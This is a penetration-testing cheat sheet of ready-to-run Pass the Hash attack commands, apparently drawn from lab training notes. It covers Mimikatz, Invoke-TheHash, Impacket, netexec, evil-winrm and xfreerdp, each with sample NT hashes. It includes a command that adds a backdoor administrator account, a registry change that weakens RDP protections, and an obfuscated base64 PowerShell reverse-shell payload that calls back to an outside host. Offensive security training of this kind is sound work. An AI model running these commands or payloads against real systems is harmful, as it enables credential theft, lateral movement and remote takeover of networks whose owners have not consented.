# Content 
- [Pass the Hash with Mimikatz (Windows)](#pass-the-hash-with-mimikatz-windows)
- [Pass the Hash with PowerShell Invoke-TheHash (Windows)](#pass-the-hash-with-powershell-invoke-thehash-windows)
- [Pass the Hash with Impacket (Linux)](#pass-the-hash-with-impacket-linux)
- [Pass the Hash with CrackMapExec or netexec (Linux)](#pass-the-hash-with-crackmapexec-or-netexec-linux)
- [Pass the Hash with evil-winrm (Linux)](#pass-the-hash-with-evil-winrm-linux)
- [Pass the Hash with RDP (Linux)](#pass-the-hash-with-rdp-linux)



**A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication.**

**Notes:**
- If the target system you are passing the hash to, has the following registry key/value/data set to 0x1, pass the hash will work even for accounts that are not RID 500 (built-in Administrator account):
```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPoli
```
- PtH only work on NT  hashes
- NTLMv1/2 hashes needs to be relyed by non-signed SMB sessions check [Relay Attacks](https://github.com/kiro6/penetration-testing-notes/tree/main/Penetration%20Testing/Password%20Attacks/Windows%20Lateral%20Movement/Relay%20Attacks)

****

## Pass the Hash with Mimikatz (Windows)
Mimikatz has a module named sekurlsa::pth that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password.

- `/user` - The user name we want to impersonate.
- `/rc4 or /NTLM` - NTLM hash of the user's password.
- `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
- `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe).
```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
Now we can use cmd.exe to execute commands in the user's context.



### Pass the Hash with PowerShell Invoke-TheHash (Windows)
- [revshells online tool](https://www.revshells.com/)

**Invoke-TheHash with SMB**
```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

**Invoke-TheHash with WMI**
```powershell
Import-Module .\Invoke-TheHash.psd1

Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```


### Pass the Hash with Impacket (Linux)

```shell
/usr/share/doc/python3-impacket/examples/psexec.py    administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
/usr/share/doc/python3-impacket/examples/smbexec.py   administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
/usr/share/doc/python3-impacket/examples/atexec.py    administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
/usr/share/doc/python3-impacket/examples/smbexec.py   administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

### Pass the Hash with CrackMapExec or netexec (Linux)
```shell
## we can add --local-auth 
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

### Pass the Hash with evil-winrm (Linux)

```shell
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

### Pass the Hash with RDP (Linux)
**Adding the DisableRestrictedAdmin Registry Key**
```shell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```bash
xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```
